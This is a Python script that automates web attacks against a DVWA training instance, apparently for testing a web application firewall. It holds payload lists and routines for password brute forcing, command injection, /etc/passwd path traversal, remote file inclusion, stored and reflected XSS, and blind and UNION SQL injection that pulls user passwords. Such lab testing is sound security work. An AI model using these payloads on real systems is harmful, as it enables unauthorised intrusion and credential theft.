import os
import requests
from bs4 import BeautifulSoup
import time

# --- 1. CONFIGURATION ---
# --- Replace these values with your DVWA setup ---

DVWA_URL = "http://192.168.18.177"  # URL for WAF testing
# Use environment variables for credentials, with fallbacks to defaults
USERNAME = os.environ.get("DVWA_USERNAME", "admin")
PASSWORD = os.environ.get("DVWA_PASSWORD", "password")
SECURITY_LEVEL = "low"  # Can be 'low', 'medium', 'high'


# --- Wordlists for attacks ---
PASSWORD_WORDLIST = ['password', '123456', 'admin', 'qwerty', 'pass']
COMMAND_INJECTION_PAYLOADS = [
    '; whoami',
    '&& whoami',
    '| whoami',
    '; ls -la',
    '&& ls -la',
    '| ls -la',
    '$(whoami)',
    '`whoami`',
]
SQL_INJECTION_PAYLOADS = {
    "boolean": "1' AND '1'='1",
    "time": "1' AND SLEEP(5)--",
    "union": "1' UNION SELECT user, password FROM users--",
}
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
]
FILE_INCLUSION_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "../dvwa/images/logo.png", # A safe, local file to include
    "http://example.com/somefile.txt", # RFI test
]



class DVWATester:
    """
    A class to automate security tests on a DVWA instance.
    """

    def __init__(self, base_url, username, password, security_level="low"):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.security_level = security_level
        self.csrf_token = None
        print(f"[*] Tester initialized for {base_url}")

    def login(self):
        """Logs into DVWA and establishes a session."""
        print("[*] Attempting to log in...")
        login_url = f"{self.base_url}/login.php"

        # Get initial CSRF token from the login page
        try:
            response = self.session.get(login_url)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})
            if token:
                self.csrf_token = token['value']
            else:  # Fallback for older DVWA versions
                self.csrf_token = None
        except requests.exceptions.RequestException as e:
            print(f"[!] Error getting login page: {e}")
            return False

        # Authenticate
        login_data = {
            "username": self.username,
            "password": self.password,
            "Login": "Login",
        }
        if self.csrf_token:
            login_data["user_token"] = self.csrf_token

        try:
            response = self.session.post(login_url, data=login_data, allow_redirects=True)
            response.raise_for_status()

            if "welcome.php" not in response.url and "index.php" not in response.url:
                print("[!] Login failed. Check credentials or DVWA status.")
                # print(f"URL after login attempt: {response.url}")
                return False

            # Set security level
            print(f"[*] Setting security level to '{self.security_level}'...")
            security_url = f"{self.base_url}/security.php"
            
            # We need to get the token from the security page
            security_page_resp = self.session.get(security_url)
            soup = BeautifulSoup(security_page_resp.text, 'html.parser')
            security_token = soup.find('input', {'name': 'user_token'})
            
            if not security_token:
                 print("[!] Could not find CSRF token on security page. Proceeding without it.")
                 security_token_value = self.csrf_token # Try with the login one
            else:
                security_token_value = security_token['value']

            security_data = {
                "security": self.security_level,
                "seclev_submit": "Submit",
                "user_token": security_token_value
            }
            
            self.session.post(security_url, data=security_data)

            print(f"[+] Login successful. Session established. Security level set to '{self.security_level}'.")
            return True

        except requests.exceptions.RequestException as e:
            print(f"[!] An error occurred during login: {e}")
            return False

    def _get_csrf_token(self, url):
        """Fetches the CSRF token from a given page."""
        try:
            response = self.session.get(url)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})
            if token:
                return token['value']
            else:
                print(f"[!] Could not find CSRF token on {url}.")
                # print("\n--- Page Source for CSRF Debug ---")
                # print(response.text)
                # print("--- End Page Source ---")
                return None
        except requests.exceptions.RequestException as e:
            print(f"[!] Error fetching CSRF token from {url}: {e}")
            return None

    def test_brute_force(self):
        """
        Tests for a weak login password via brute force.
        Target: Login Page
        Note: This test is independent of the main session.
        """
        print("\n--- [Running] Brute Force Test ---")
        login_url = f"{self.base_url}/login.php"
        username = "admin"
        
        # This test uses its own session
        brute_force_session = requests.Session()

        for password in PASSWORD_WORDLIST:
            print(f"[*] Trying password for '{username}': {password}")
            
            # Get a fresh token for each attempt
            try:
                r = brute_force_session.get(login_url)
                soup = BeautifulSoup(r.text, 'html.parser')
                token = soup.find('input', {'name': 'user_token'})['value']
            except Exception:
                token = None # Continue without token if not found

            login_data = {
                "username": username,
                "password": password,
                "Login": "Login",
                "user_token": token
            }
            
            response = brute_force_session.post(login_url, data=login_data)
            
            if "welcome.php" in response.url or "you have logged in" in response.text.lower():
                print(f"[+] SUCCESS: Brute force successful! Credentials: {username}/{password}")
                return
            elif "login failed" not in response.text.lower():
                 print(f"[?] The login page response changed unexpectedly with password '{password}'. Manual check recommended.")

        print("[-] FAILED: Brute force test completed. No weak passwords found from the list.")

    def test_command_injection(self):
        """
        Tests for Command Injection vulnerability.
        Target: Exec page
        """
        print("\n--- [Running] Command Injection Test ---")
        exec_url = f"{self.base_url}/vulnerabilities/exec/"
        
        # Get a valid CSRF token first, but only if security is not low
        token = None
        if self.security_level != "low":
            token = self._get_csrf_token(exec_url)
            if not token:
                print("[!] Could not get CSRF token. Aborting command injection test.")
                return
            print(f"[*] Got CSRF token: {token}")

        for payload in COMMAND_INJECTION_PAYLOADS:
            # The base IP we "ping" is irrelevant, the payload is what matters.
            full_payload = f"127.0.0.1{payload}"
            print(f"[*] Trying payload: {full_payload}")

            post_data = {
                "ip": full_payload,
                "Submit": "Submit",
            }
            if token:
                post_data["user_token"] = token
            
            try:
                response = self.session.post(exec_url, data=post_data)
                response.raise_for_status()
                
                # Check if the command output is in the response
                # `whoami` returns the web server user (e.g., www-data)
                if "www-data" in response.text or "root" in response.text or "total" in response.text:
                    print(f"[+] SUCCESS: Command Injection vulnerability found with payload: '{payload}'")
                    print(f"    -> Output snippet:\n{response.text[response.text.find('<pre>')+5:response.text.find('</pre>')]}")
                    return
            except requests.exceptions.RequestException as e:
                print(f"[!] An error occurred during request: {e}")

        print("[-] FAILED: Command Injection test completed. No vulnerabilities found.")

    def test_file_inclusion(self):
        """
        Tests for File Inclusion vulnerability.
        Target: File Inclusion page
        """
        print("\n--- [Running] File Inclusion Test ---")
        fi_url = f"{self.base_url}/vulnerabilities/fi/"

        for payload in FILE_INCLUSION_PAYLOADS:
            print(f"[*] Trying payload: {payload}")
            
            try:
                response = self.session.get(fi_url, params={'page': payload})
                response.raise_for_status()
                
                # Check for signs of successful inclusion
                if "root:x:0:0" in response.text or "PNG" in response.text:
                    print(f"[+] SUCCESS: File Inclusion vulnerability found with payload: '{payload}'")
                    return
            except requests.exceptions.RequestException as e:
                if isinstance(e, requests.exceptions.HTTPError) and e.response.status_code == 403:
                    print(f"[*] INFO: WAF blocked request with payload: '{payload}' (403 Forbidden)")
                else:
                    print(f"[!] An error occurred during request: {e}")

        print("[-] FAILED: File Inclusion test completed. No vulnerabilities found.")

    def test_stored_xss(self):
        """
        Tests for Stored XSS vulnerability.
        Target: XSS (Stored) page
        """
        print("\n--- [Running] Stored XSS Test ---")
        xss_s_url = f"{self.base_url}/vulnerabilities/xss_s/"
        
        # Get a valid CSRF token first, but only if security is not low
        token = None
        if self.security_level != "low":
            token = self._get_csrf_token(xss_s_url)
            if not token:
                print("[!] Could not get CSRF token. Aborting stored XSS test.")
                return

        for payload in XSS_PAYLOADS:
            print(f"[*] Trying payload: {payload}")
            
            post_data = {
                "txtName": "test",
                "mtxMessage": payload,
                "btnSign": "Sign Guestbook",
            }
            if token:
                post_data["user_token"] = token
            
            try:
                response = self.session.post(xss_s_url, data=post_data)
                response.raise_for_status()
                
                # Check if the payload is now stored in the page
                if payload in response.text:
                    print(f"[+] SUCCESS: Stored XSS payload was successfully submitted: '{payload}'")
                    # A full test would require a separate session to view the page
                    # and see if the script executes. This is a simplified check.
                    return
            except requests.exceptions.RequestException as e:
                if isinstance(e, requests.exceptions.HTTPError) and e.response.status_code == 403:
                    print(f"[*] INFO: WAF blocked request with payload: '{payload}' (403 Forbidden)")
                else:
                    print(f"[!] An error occurred during request: {e}")

        print("[-] FAILED: Stored XSS test completed. No payloads were stored.")

    def test_sql_injection_blind(self):
        """
        Tests for Blind SQL Injection vulnerability.
        Target: SQLI (Blind) page
        """
        print("\n--- [Running] Blind SQL Injection Test ---")
        sqli_blind_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
        
        print("[*] Testing boolean-based blind SQLi...")
        true_payload = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"
        
        try:
            response_true = self.session.get(sqli_blind_url, params={'id': true_payload, 'Submit': 'Submit'})
            user_exists_true = "User ID exists in the database." in response_true.text
            
            response_false = self.session.get(sqli_blind_url, params={'id': false_payload, 'Submit': 'Submit'})
            user_exists_false = "User ID exists in the database." in response_false.text

            if user_exists_true and not user_exists_false:
                print("[+] SUCCESS: Boolean-based Blind SQL Injection confirmed!")
            else:
                print("[-] FAILED: Boolean-based test inconclusive.")

            print("\n[*] Testing time-based blind SQLi...")
            sleep_duration = 5
            time_payload = f"1' AND SLEEP({sleep_duration})--"
            
            start_time = time.time()
            self.session.get(sqli_blind_url, params={'id': time_payload, 'Submit': 'Submit'})
            end_time = time.time()
            
            duration = end_time - start_time
            print(f"[*] Request with SLEEP({sleep_duration}) took {duration:.2f} seconds.")

            if duration >= sleep_duration:
                print(f"[+] SUCCESS: Time-based Blind SQL Injection confirmed! (Delay of {duration:.2f}s)")
            else:
                print("[-] FAILED: Time-based test inconclusive.")

        except requests.exceptions.RequestException as e:
            print(f"[!] An error occurred during request: {e}")
            
    def test_reflected_xss(self):
        """
        Tests for Reflected XSS vulnerability.
        Target: XSS (Reflected) page
        """
        print("\n--- [Running] Reflected XSS Test ---")
        xss_r_url = f"{self.base_url}/vulnerabilities/xss_r/"
        payload = "<script>alert('xss')</script>"
        
        print(f"[*] Injecting payload: {payload}")
        
        try:
            # This request doesn't need a CSRF token on the GET
            response = self.session.get(xss_r_url, params={'name': payload})
            response.raise_for_status()
            
            if payload in response.text:
                print("[+] SUCCESS: XSS payload was reflected in the response!")
                print("    -> Manual verification in a browser is required to confirm execution.")
            else:
                print("[-] FAILED: XSS payload was not found in the response.")

        except requests.exceptions.RequestException as e:
            print(f"[!] An error occurred during request: {e}")


if __name__ == "__main__":
    # --- 2. SCRIPT EXECUTION ---
    # Initialize the tester
    tester = DVWATester(DVWA_URL, USERNAME, PASSWORD, SECURITY_LEVEL)
    
    # Login to establish session
    if tester.login():
        # Run the tests
        # You can comment out tests you don't want to run
        tester.test_brute_force()
        tester.test_command_injection()
        tester.test_file_inclusion()
        tester.test_sql_injection_blind()
        tester.test_reflected_xss()
        tester.test_stored_xss()
    else:
        print("\n[!] Exiting script due to login failure.")